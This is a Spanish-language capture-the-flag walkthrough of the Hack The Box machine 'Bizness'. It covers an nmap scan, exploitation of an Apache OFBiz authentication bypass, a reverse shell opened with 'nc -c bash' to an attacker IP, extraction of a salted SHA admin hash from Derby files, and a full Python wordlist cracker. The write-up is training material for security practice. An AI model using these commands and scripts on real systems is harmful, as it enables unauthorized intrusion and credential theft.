Primero de todo haremos un escaneo de la ip para ver que puertos estan abiertos y que servicios tiene asociados.

`sudo nmap -sV -sC --min-rate 7000 -p- -Pn 10.10.11.252 -oN escaneo`

<img src="Pasted image 20240426090418.png">

Vemos que está corriendo una web. Entonces procediremos a realizar un fuzzing de la misma.
Al hacerlo hemos encontrado una ruta que es `/control/login` que nos redirecciona a un apache OFBiz.
<img src="Pasted image 20240426092249.png">

Vamos a intentar bypassearlo, para ello buscaremos `apache ofbiz bypass` y entraremos al primer link. (https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) y clonaremos el github.

`git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git`

<img src="Pasted image 20240426092605.png">

Ahora vamos a ejecutar el exploit. Para ello nos vamos a poner en escucha con netcat y luego ejecutaremos el exploit.

`nc -lnvp 4444`

Y en otra terminal el exploit.

`python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.14.38 4444'`

<img src="Pasted image 20240426093645.png">

Como podemos ver tenemos el control de la máquina. Ahora nos pondremos en la carpeta del usuario y veremos que está la flag de usuario.
<img src="Pasted image 20240426093845.png">

Para escalar privilegios nos situaremos en la carpeta /opt/ofbiz y analizaremos los archivos y directorios. Tras analizar detalladamente he encontrado un archivo con la ruta:

`/opt/ofbiz/framework/resources/templates/AdminUserLogin.xml`

Este contenia el tipo de cifrado que es sha.

`{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a`

Tocará descifrarla, pero antes en la ruta:

`/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat`

He encontrado al password.

`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

Para poder descifrarla, he encontrado el siguiente exploit y hay que introducir nuesto hash y tipo de cifrado.
````
import hashlib
import base64
import os
from tqdm import tqdm

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
        """
        Initialize the PasswordEncryptor object with a hash type and PBKDF2 iterations.

        :param hash_type: The hash algorithm to use (default is SHA).
        :param pbkdf2_iterations: The number of iterations for PBKDF2 (default is 10000).
        """
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):
        """
        Crypt a password using the specified hash type and salt.

        :param salt: The salt used in the encryption.
        :param value: The password value to be encrypted.
        :return: The encrypted password string.
        """
        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

    def get_crypted_bytes(self, salt, value):
        """
        Get the encrypted bytes for a password.

        :param salt: The salt used in the encryption.
        :param value: The password value to get encrypted bytes for.
        :return: The encrypted bytes as a string.
        """
        try:
            hash_obj = hashlib.new(self.hash_type)
            hash_obj.update(salt.encode('utf-8'))
            hash_obj.update(value)
            hashed_bytes = hash_obj.digest()
            return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
        except hashlib.NoSuchAlgorithmException as e:
            raise Exception(f"Error while computing hash of type {self.hash_type}: {e}")

# Example usage:
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/share/wordlists/rockyou.txt'

# Create an instance of the PasswordEncryptor class
encryptor = PasswordEncryptor(hash_type)

# Get the number of lines in the wordlist for the loading bar
total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

# Iterate through the wordlist with a loading bar and check for a matching password
with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in tqdm(password_list, total=total_lines, desc="Processing"):
        value = password.strip()
        
        # Get the encrypted password
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))
        
        # Compare with the search hash
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
            break  # Stop the loop if a match is found
````

Lo ejecutamos y nos da el password.
<img src="Pasted image 20240426100223.png">
<img src="Pasted image 20240426100347.png]]![[Pasted image 20240426100536.png">
